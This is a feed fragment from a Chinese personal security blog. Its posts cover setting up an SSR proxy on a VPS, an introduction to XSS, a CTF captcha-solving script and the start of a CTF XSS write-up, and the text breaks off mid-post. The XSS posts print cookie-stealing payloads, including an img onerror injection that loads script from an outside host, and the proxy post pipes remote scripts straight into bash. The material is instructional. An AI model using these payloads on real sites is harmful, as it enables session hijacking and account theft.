alt><br>倒数2、3分别是微信和支付宝，扫码支付就可以了。</p><p>选择服务器<br><img src="/2019/04/09/VPS服务器搭建SSR_SS/Image0004.png" alt><br>选一个适合你的（延迟低的服务器）推荐日本和美国。如果不清楚哪个延迟低可以去这里测试一下<br><a href="http://ga-us-ping.vultr.com/" target="_blank" rel="noopener">http://ga-us-ping.vultr.com/</a><br><img src="/2019/04/09/VPS服务器搭建SSR_SS/Image0005.png" alt><br>ms越低越好。</p><p>选择系统和机器<br><img src="/2019/04/09/VPS服务器搭建SSR_SS/Image0006.png" alt><br>由于我使用kali较多所以我选了Debian，无特殊需求选默认的CentOS就可以了。机器的话如果仅仅用来fan墙，最便宜的就足够了。</p><p>后面的选项对此次的目的来说没有意义，因此全部采用的默认，具体功能自行了解。最后点击下方deploy now。</p><p>这样我们就有了一台自己的海外服务器。<br><img src="/2019/04/09/VPS服务器搭建SSR_SS/Image0007.png" alt><br>点击你的服务器进入详页可以看到你服务器IP和用户名、密码。后边会用到。<br><img src="/2019/04/09/VPS服务器搭建SSR_SS/Image0008.png" alt><br>下载xshell 链接：<a href="https://pan.baidu.com/s/11FRT_RPIVZjyvMkjx-zYbA" target="_blank" rel="noopener">https://pan.baidu.com/s/11FRT_RPIVZjyvMkjx-zYbA</a> 提取码：ffki<br>安装完毕后新建连接。<br><img src="/2019/04/09/VPS服务器搭建SSR_SS/Image0009.png" alt><br>名字随意，主机号就是你申请的副武器的IP，端口一般默认22，可以自己修改。点击确定并连接主机。<br><img src="/2019/04/09/VPS服务器搭建SSR_SS/Image0010.png" alt><br><img src="/2019/04/09/VPS服务器搭建SSR_SS/Image0011.png" alt><br>输入服务器的用户名密码。连接服务器。<br><img src="/2019/04/09/VPS服务器搭建SSR_SS/Image0012.png" alt><br>如图表示连接成功。</p><p>输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -N --no-check-certificate https://raw.githubusercontent.com/hombo125/doubi/master/ssr.sh &amp;&amp; chmod +x ssr.sh &amp;&amp; bash ssr.sh</span><br></pre></td></tr></table></figure><p>如果失败则先输入下面的指令再次运行上面的指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install wget</span><br></pre></td></tr></table></figure><p>运行完成后出现如下提示，输入数字1安装ssr服务端<br><img src="/2019/04/09/VPS服务器搭建SSR_SS/Image0013.png" alt><br>输入端口和账号密码，端口的可选范围为60~65535。<br><img src="/2019/04/09/VPS服务器搭建SSR_SS/Image0014.png" alt><br>选择加密方式，输入对应数字即可，下面机几个操作的选择取决于个人，作者均采用默认设置。<br><img src="/2019/04/09/VPS服务器搭建SSR_SS/Image0015.png" alt><br>协议插件<br><img src="/2019/04/09/VPS服务器搭建SSR_SS/Image0016.png" alt><br><img src="/2019/04/09/VPS服务器搭建SSR_SS/Image0017.png" alt><br>设置混淆（通过代理玩游戏推荐第一个速度快一些）<br><img src="/2019/04/09/VPS服务器搭建SSR_SS/Image0018.png" alt><br>设备限制空（回车）默认无限制，需要对访问速度加以限制的自己输入速率上限就行。<br><img src="/2019/04/09/VPS服务器搭建SSR_SS/Image0019.png" alt><br>下载文件<br><img src="/2019/04/09/VPS服务器搭建SSR_SS/Image0020.png" alt><br>安装完成后会显示相关信息，记得保存。<br><img src="/2019/04/09/VPS服务器搭建SSR_SS/Image0021.png" alt><br>若不慎关闭可以输入bash ssr.sh进入管理界面根据提示查看或者修改信息。<br><img src="/2019/04/09/VPS服务器搭建SSR_SS/Image0022.png" alt><br>重启服务器，可以再界面输入reboot也可以在你的vultr管理界面里重启。</p><p>安装BBR加速器，输入如下指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget --no-check-certificate https://github.com/teddysun/across/raw/master/bbr.sh</span><br><span class="line">chmod +x bbr.sh</span><br><span class="line">./bbr.sh</span><br></pre></td></tr></table></figure><p>按任意键安装。<br><img src="/2019/04/09/VPS服务器搭建SSR_SS/Image0023.png" alt><br>完成后提示重启服务器选择Y或手动重启。重启后输入lsmod | grep bbr查看是否安装成功。<br><img src="/2019/04/09/VPS服务器搭建SSR_SS/Image0024.png" alt><br>如上图安装成功。</p><p>下载代理设置工具 链接：<a href="https://pan.baidu.com/s/1_68i7TxfdT4lv3Kupge2wQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1_68i7TxfdT4lv3Kupge2wQ</a> 提取码：z8jh </p><p><img src="/2019/04/09/VPS服务器搭建SSR_SS/Image0025.png" alt><br>把之前保存的ssr配置信息填上。</p><p>设置浏览器的代理服务，地址127.0.0.1端口1080。<br><img src="/2019/04/09/VPS服务器搭建SSR_SS/Image0026.png" alt><br>使用全局模式所有浏览器就都可以使用代理服务了。<br><img src="/2019/04/09/VPS服务器搭建SSR_SS/Image0027.png" alt><br>Chrome可以使用自己的SwitchyOmega插件来定制自己的代理服务，但是这个插件的官方链接也被墙了，这里给出一个离线下载<a href="https://chrome-extension-downloader.com/。使用很简单实在不懂就Baidu一下吧。" target="_blank" rel="noopener">https://chrome-extension-downloader.com/。使用很简单实在不懂就Baidu一下吧。</a></p><p>至此vps服务器搭建ssr/ss就完成了，效果。<br><img src="/2019/04/09/VPS服务器搭建SSR_SS/Image0028.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;实在是忍受不了国内博客论坛千篇一律的抄袭现象，决定去翻阅一下国外的资料。但又因为国内现成的VPN基本全被封杀，即便是有几个可以用的也会收费并且非常不稳定，于是决定自己动手打一个梯子。&lt;br&gt;服务器：&lt;strong&gt;vultr&lt;/strong&gt;（比较实惠、稳定的国外服务器）&lt;br&gt;工具：&lt;strong&gt;xshell&lt;/strong&gt;、&lt;strong&gt;shadowstocks&lt;/strong&gt;、&lt;strong&gt;bbr&lt;/strong&gt;、&lt;strong&gt;代理服务设置工具&lt;/strong&gt;（下边会给出链接）&lt;br&gt;首先是搞到服务器，去vultr注册账号。&lt;a href=&quot;https://www.vultr.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.vultr.com/&lt;/a&gt;&lt;br&gt;&lt;img src=&quot;/2019/04/09/VPS服务器搭建SSR_SS/Image0001.png&quot; alt&gt;&lt;br&gt;填写邮箱和密码，会给你发个邮件激活账号。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>什么是 XSS</title>
    <link href="https://kkkiona.github.io/2019/04/08/%E4%BB%80%E4%B9%88%E6%98%AFXSS/"/>
    <id>https://kkkiona.github.io/2019/04/08/什么是XSS/</id>
    <published>2019-04-08T15:34:10.787Z</published>
    <updated>2019-04-15T06:07:45.346Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>这几天一直在做CTF上的XSS题目，走了很多弯路，但是也学到了很多东西，这篇博文主要讲一下什么是XSS，下一篇讲说一下几道题目的做法。</p><p><strong>XSS 简介</strong></p><p>跨站脚本攻击：英文是Cross Site Script，本应缩写为 CSS，但是为了和层叠样式表有所区别所以在安全领域称之为 XSS 。<br>XSS 攻击，通常指黑客通过“HTML 注入”篡改网页内容，插入恶意脚本，从而在客户浏览网页的时候，控制用户浏览器的一种攻击。简单来说就是黑客通过探测可以植入数据的地方如URL，文本框等的漏洞，来注入恶意HTML代码从而获取像cookies等重要信息，甚至更严重的危害。这一点十分类似于SQL 注入，只不过这里注入的是HTML和JS。此外XSS最早的案例是跨域的，但时至今日跨域这一特点已不在重要，但是XSS这个名字却一直延续至今。<br>即便XSS长期位居Web安全的头号大敌，但是由于XSS破坏性强，且产生的原因复杂，很难以一次性解决，所以现今复杂的网络应用环境滋生着大量的XSS漏洞。</p><p><strong>XSS 分类</strong></p><p><strong>第一种：反射型 XSS</strong></p><p>反射型XSS是最简单的类型，是指简单地把用户数据“反射”给浏览器。也就是说，黑客往往需要诱导用户点击一个恶意练级，才能攻击成功。反射型 XSS也叫做 “非持久性 XSS” （Non-persistent XSS）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if(isset($_GET[&apos;name&apos;]))&#123; </span><br><span class="line">        $text=$_GET[&apos;name&apos;];</span><br><span class="line">        echo &quot;&lt;div&gt;&quot;.$text.&quot;&lt;/div&gt;&quot; ; </span><br><span class="line">&#125; </span><br><span class="line">echo &apos;&lt;hr /&gt;&apos;; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这段代码不加检查的把用户输入信息打印出来，如果我们输入以下代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.a.com/a.php?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/04/08/什么是XSS/Image0001.png" alt></p><p>代码被执行了，用户cookies被打印出来。<br><a id="more"></a><br><strong>第二种：存储型 XSS</strong></p><p>存储型 XSS 会把用户输入的数据“存储”在远端服务器。这种 XSS 具有很强的稳定性。<br>上边的例子中可以看出用户点击恶意链接之后弹出cookies对话框，但是远端的黑客并不知道。如果编写一段代码可以把获取的cookies发送到黑客的服务器或者邮箱上，就可以窃取用户cookies了。但是这种代码比较庞大不适合写成临时文件，如放在URL中会使得URL过长可能导致意想不到的错误，因此需要把代码事先写好，存在服务器上通过各种方式在客户端运行此代码。这种代码称为 XSS Payload。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://www.a.com/xss&apos;;&gt;</span><br></pre></td></tr></table></figure><p>这段代码会生成一个实际并不存在的图片，图片地址里面包含了恶意代码的地址，这样代码便被浏览器执行了，客户信息将被事先编写的js获取并告知黑客。<br>现如今互联网上遍布着各种公开的XSS Payload 模块，XSS 测试平台也很多，不想自己搭建的话可以直接使用，各平台大部分都是从GitHub上clone的大同小异，可以在项目管理界面实时查看成果。<br><img src="/2019/04/08/什么是XSS/Image0002.png" alt><br>推荐一下国外的XSS Hunter ，这个平台可以把结果发送到你的邮箱，并且支持的注入方式很多，攻击模块也比较齐全，坏处就是国内访问延迟有点大，全英文会坑新人。有兴趣的话还是自己用kali搭个BeEF吧，谁用谁知道。</p><p><strong>第三种：DOM Based XSS</strong></p><p>实际上，这种类型的XSS并非按照“数据是否存储在服务器”来划分，DOM Based XSS 从效果上来说也是反射型XSS。只是因为其成因比较特殊，使用过修改页面的DOM节点来形成的XSS，称之为 DOM Based XSS。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function fun()&#123;</span><br><span class="line">var str=document.getElementById(&quot;text&quot;).value;</span><br><span class="line">var d=document.getElementById(&quot;t&quot;).innerHTML=&quot;&lt;a herf=&apos; &quot;+str+&quot; &apos;&gt;link&lt;/a&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;t&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; id=&quot;text&quot; value=&quot;&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;button&quot; id=&quot;s&quot; value=&quot;write&quot;  onclick=&quot;fun()&quot; /&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/04/08/什么是XSS/Image0003.png" alt><br>页面根据用户的输入生成一个链接，由于没有进行合法性检查，所以可以输入以下代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; onclick=alert(document.cookie) //</span><br></pre></td></tr></table></figure><p>点击链接用户信息被输出。<br><img src="/2019/04/08/什么是XSS/Image0004.png" alt><br>这里用到了闭合的技巧会在下一篇博文中讲到。</p><p>这是关于XSS的简单介绍，下篇中会结合题目说一些XSS攻击方式。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这几天一直在做CTF上的XSS题目，走了很多弯路，但是也学到了很多东西，这篇博文主要讲一下什么是XSS，下一篇讲说一下几道题目的做法。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;XSS 简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;跨站脚本攻击：英文是Cross Site Script，本应缩写为 CSS，但是为了和层叠样式表有所区别所以在安全领域称之为 XSS 。&lt;br&gt;XSS 攻击，通常指黑客通过“HTML 注入”篡改网页内容，插入恶意脚本，从而在客户浏览网页的时候，控制用户浏览器的一种攻击。简单来说就是黑客通过探测可以植入数据的地方如URL，文本框等的漏洞，来注入恶意HTML代码从而获取像cookies等重要信息，甚至更严重的危害。这一点十分类似于SQL 注入，只不过这里注入的是HTML和JS。此外XSS最早的案例是跨域的，但时至今日跨域这一特点已不在重要，但是XSS这个名字却一直延续至今。&lt;br&gt;即便XSS长期位居Web安全的头号大敌，但是由于XSS破坏性强，且产生的原因复杂，很难以一次性解决，所以现今复杂的网络应用环境滋生着大量的XSS漏洞。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;XSS 分类&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第一种：反射型 XSS&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;反射型XSS是最简单的类型，是指简单地把用户数据“反射”给浏览器。也就是说，黑客往往需要诱导用户点击一个恶意练级，才能攻击成功。反射型 XSS也叫做 “非持久性 XSS” （Non-persistent XSS）。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;?php &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;if(isset($_GET[&amp;apos;name&amp;apos;]))&amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $text=$_GET[&amp;apos;name&amp;apos;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        echo &amp;quot;&amp;lt;div&amp;gt;&amp;quot;.$text.&amp;quot;&amp;lt;/div&amp;gt;&amp;quot; ; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;echo &amp;apos;&amp;lt;hr /&amp;gt;&amp;apos;; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这段代码不加检查的把用户输入信息打印出来，如果我们输入以下代码。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http://www.a.com/a.php?name=&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;/2019/04/08/什么是XSS/Image0001.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;代码被执行了，用户cookies被打印出来。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SVG 图片验证码解码</title>
    <link href="https://kkkiona.github.io/2019/04/08/SVG-%E5%9B%BE%E7%89%87%E9%AA%8C%E8%AF%81%E7%A0%81%E8%A7%A3%E7%A0%81/"/>
    <id>https://kkkiona.github.io/2019/04/08/SVG-图片验证码解码/</id>
    <published>2019-04-08T06:56:59.000Z</published>
    <updated>2019-04-15T06:08:02.729Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>环境：<strong>Python 3</strong><br>外部依赖：<strong>requests、bs4、BeautifulSoup、base64</strong><br>先看题目：<br><img src="/2019/04/08/SVG-图片验证码解码/Image0001.png" alt><br>题目类似于公式计算的那道题只是公式变成了图片验证码，所以关于爬虫和网页请求请看<a href="https://kkkiona.github.io/2019/04/05/Python%20%E7%AE%80%E5%8D%95%E7%9A%84%E7%BD%91%E9%A1%B5%E6%8A%93%E5%8F%96%E5%92%8C%E6%8F%90%E4%BA%A4%E8%A1%A8%E5%8D%95/">https://kkkiona.github.io/2019/04/05/Python%20%E7%AE%80%E5%8D%95%E7%9A%84%E7%BD%91%E9%A1%B5%E6%8A%93%E5%8F%96%E5%92%8C%E6%8F%90%E4%BA%A4%E8%A1%A8%E5%8D%95/</a><br>下面是解题过程：<br><strong>查看网页代码</strong><br><img src="/2019/04/08/SVG-图片验证码解码/Image0002.png" alt><br>是用SVG制作的图片并且采用了base64进行了加密。由于作者有一些canvas的使用经验，因此对SVG也有所了解，这里简单说一下。SVG是一种适量绘制技术，与HTML5的canvas技术相比最大的区别就是，canvas有与之关联的JavaScript API 但是SVG是通过xml来控制的。SVG的绘制质量运行速率也不如canvas，好处就是易于控制。后期我会发一篇详细的介绍。<br><a id="more"></a><br>回归主题，<strong>把这个图片单独拿出来看一下</strong><br><img src="/2019/04/08/SVG-图片验证码解码/Image0003.png" alt><br>就是这个样子，可以看到URL的base64后面跟了一大堆乱码，这就是加密的xml文档，F12可以看到解密以后的样子，当然也可以通过各种解密工具查看。<br><img src="/2019/04/08/SVG-图片验证码解码/Image0004.png" alt><br>那么我们就有两种思路，第一种就是像这样靠浏览器来解码然后抓解码后的内容，如果这么做就完全变成抓包游戏了，所以我更推荐第二种<strong>本地解码</strong>。<br><strong>先抓取题目的原始页面，然后通过简单的字符切割获取那段乱码字符串</strong>，方法见上面链接，这里只给出代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(url)</span><br><span class="line">soup = BeautifulSoup(response.text, &quot;html.parser&quot;)</span><br><span class="line">src = soup.find(&quot;img&quot;).get(&quot;src&quot;).split(&apos;,&apos;)[1]</span><br></pre></td></tr></table></figure><p><strong>接下来重点就是解码，使用base64包解码。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">enc = base64.b64decode(src)</span><br></pre></td></tr></table></figure><p>可以把解码后的内容打印输出看一下，会发现跟浏览器的显示一样这里就不放图片了。<br>下面的内容就很简单了，上方连接使用的关键字提取方法一样，只需要把text标签里面的内容提取出来组和并提交就可以了。但是结果会发现提交的结果是Wrong。<br>仔细观察图片和浏览器里的解码后的代码会发现<br><img src="/2019/04/08/SVG-图片验证码解码/Image0005.png" alt><br><img src="/2019/04/08/SVG-图片验证码解码/Image0006.png" alt><br>text中字符的排列顺序并不是想要的顺序，如上代码的前两个字符是D u 但是图片是t S。原来图片中的字符顺序是根据<strong>x轴</strong>的位置决定的，那么我们就需要对获取的<strong>文本重新排序</strong>了。</p><p>鉴于我的Python学的跟shi一样（正在重学）所以以下内容仅供参考，比我方法好的比比皆是。</p><p><strong>将解码的文件转换为BeautifulSoup对象</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">soup = BeautifulSoup(enc, &quot;xml&quot;)</span><br></pre></td></tr></table></figure><p><strong>查找所有text标签并返回tag对象，将tag对象的x轴的值转换为int类，并且连同text里面的字符逐个付给一个空的list列表。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">List = []</span><br><span class="line"></span><br><span class="line">for tag in soup.find_all(&apos;text&apos;):</span><br><span class="line">    List.append([int(tag[&apos;x&apos;]), tag.string])</span><br></pre></td></tr></table></figure><p>tag是soup.find()返回的对象类型，具体关于<strong>BeautifuSsoup</strong>的使用可以参考官文<a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc.zh/" target="_blank" rel="noopener">https://www.crummy.com/software/BeautifulSoup/bs4/doc.zh/</a></p><p><strong>接下来只需要使用list的排序功能就可以了</strong>，由于我把x的值作为了第一个属性所以无需指定排序关键字，放到第二个的话需要手动指定，步骤很简单自行搜索即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">List.sort()</span><br></pre></td></tr></table></figure><p>可以输出看一下字符的顺序按照离x轴的距离拍好了。最后取出里面的字符组合起来就可以了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getString = &quot;&quot;</span><br><span class="line"></span><br><span class="line">for c in List:</span><br><span class="line">    getString += c[1]</span><br></pre></td></tr></table></figure><p>剩下的就是提交了这里就不重复了。<br>最后结果<br><img src="/2019/04/08/SVG-图片验证码解码/Image0007.png" alt><br>OK，最后完整代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">url = &quot;http://example.com/&quot;</span><br><span class="line"></span><br><span class="line">response = requests.get(url)</span><br><span class="line"></span><br><span class="line">Cookies = response.cookies</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(response.text, &quot;html.parser&quot;)</span><br><span class="line"></span><br><span class="line">src = soup.find(&quot;img&quot;).get(&quot;src&quot;).split(&apos;,&apos;)[1]</span><br><span class="line"></span><br><span class="line">enc = base64.b64decode(src)</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(enc, &quot;xml&quot;)</span><br><span class="line"></span><br><span class="line">List = []</span><br><span class="line"></span><br><span class="line">for tag in soup.find_all(&apos;text&apos;):</span><br><span class="line">    List.append([int(tag[&apos;x&apos;]), tag.string])</span><br><span class="line"></span><br><span class="line">List.sort()</span><br><span class="line"></span><br><span class="line">getString = &quot;&quot;</span><br><span class="line"></span><br><span class="line">for c in List:</span><br><span class="line">    getString += c[1]</span><br><span class="line"></span><br><span class="line">response = requests.get(url + &quot;?code=&quot; + getString, cookies = Cookies)</span><br><span class="line"></span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><p>最最后附上Python的其他编码解码方式。转载：<br><a href="https://blog.csdn.net/five3/article/details/83626446" target="_blank" rel="noopener">https://blog.csdn.net/five3/article/details/83626446</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;环境：&lt;strong&gt;Python 3&lt;/strong&gt;&lt;br&gt;外部依赖：&lt;strong&gt;requests、bs4、BeautifulSoup、base64&lt;/strong&gt;&lt;br&gt;先看题目：&lt;br&gt;&lt;img src=&quot;/2019/04/08/SVG-图片验证码解码/Image0001.png&quot; alt&gt;&lt;br&gt;题目类似于公式计算的那道题只是公式变成了图片验证码，所以关于爬虫和网页请求请看&lt;a href=&quot;https://kkkiona.github.io/2019/04/05/Python%20%E7%AE%80%E5%8D%95%E7%9A%84%E7%BD%91%E9%A1%B5%E6%8A%93%E5%8F%96%E5%92%8C%E6%8F%90%E4%BA%A4%E8%A1%A8%E5%8D%95/&quot;&gt;https://kkkiona.github.io/2019/04/05/Python%20%E7%AE%80%E5%8D%95%E7%9A%84%E7%BD%91%E9%A1%B5%E6%8A%93%E5%8F%96%E5%92%8C%E6%8F%90%E4%BA%A4%E8%A1%A8%E5%8D%95/&lt;/a&gt;&lt;br&gt;下面是解题过程：&lt;br&gt;&lt;strong&gt;查看网页代码&lt;/strong&gt;&lt;br&gt;&lt;img src=&quot;/2019/04/08/SVG-图片验证码解码/Image0002.png&quot; alt&gt;&lt;br&gt;是用SVG制作的图片并且采用了base64进行了加密。由于作者有一些canvas的使用经验，因此对SVG也有所了解，这里简单说一下。SVG是一种适量绘制技术，与HTML5的canvas技术相比最大的区别就是，canvas有与之关联的JavaScript API 但是SVG是通过xml来控制的。SVG的绘制质量运行速率也不如canvas，好处就是易于控制。后期我会发一篇详细的介绍。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>XSS 题目解析（上篇）</title>
    <link href="https://kkkiona.github.io/2019/04/08/XSS-%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-%EF%BC%88%E4%B8%8A%E7%AF%87%EF%BC%89/"/>
    <id>https://kkkiona.github.io/2019/04/08/XSS-题目解析-（上篇）/</id>
    <published>2019-04-08T00:56:59.000Z</published>
    <updated>2019-04-15T06:08:06.997Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在开始解题之前先说一下什么是<strong>Proof Of Work</strong>，一会会用到。<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0001.png" alt><br><strong>Proof Of Work</strong> 简称<strong>POW</strong>中文叫做工作量证明，简单来说就是用户需要通过计算机完成一定量的计算工作，才能获得需要的信息。可以用来防御拒绝服务攻击也可以用于电子货币。图片上简单说就是你得用计算机算出来这个验证码。图片的要求上说的很清楚了你的验证码前0-6位必须经过MD5加密后能够匹配示例字符串。那么接下来只需要写个脚本跑一下就可以了，官方提供了POW的工具但是我的环境没有调试成功等我试验成功了在发出来过程，这里先用自己的Python代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from itertools import count</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">def md5(s):</span><br><span class="line">    return hashlib.md5(s.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">for i in count(100000):</span><br><span class="line">    if md5(str(i)).startswith(&apos;49ab02&apos;):</span><br><span class="line">        print(i)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><p>使用 haslib 进行MD5加密运算，创建一个 itertools 迭代器 利用cout() 方法从100000开始依次叠加 并将生成数字编码，直到找到前6位能够匹配示例字符的数字。</p><p>知道了怎么获取这个验证码现在开始解题。</p><p><strong>第一题：Baby XSS</strong></p><p><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0002.png" alt><br>根据题目描述，我们需要以admin的身份访问admin.php才能获取里面的flag。先点开admin.php看一下<br><a id="more"></a><br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0003.png" alt><br>果然不行，提示你不是admin。那么既然如此我们就需要获取admin的身份。由此想到获取admin的<strong>cookies</strong>然后通过<strong>Burp Suite</strong>工具修改登录时的cookies就可以了。</p><p>现在问题变成了获取cookies。题目给出了给admin发送message的文本框，自然就想到用XSS获取cookies。</p><p>先试探一下目标有没有设置过滤机制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0004.png" 